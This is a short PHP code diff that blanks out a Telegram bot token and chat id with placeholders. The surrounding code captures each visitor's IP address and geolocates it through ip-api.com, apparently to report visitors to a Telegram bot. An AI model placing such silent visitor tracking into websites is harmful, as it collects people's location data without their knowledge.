@@ -12,8 +12,8 @@ function telegram($msg) {
         return $result;
 }
 
-$telegrambot = '808glo'; // enter bot token
-$telegramchatid = 808; // enter chat id
+$telegrambot = 'fill parameter'; // enter bot token
+$telegramchatid = fill parameter; // enter chat id
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
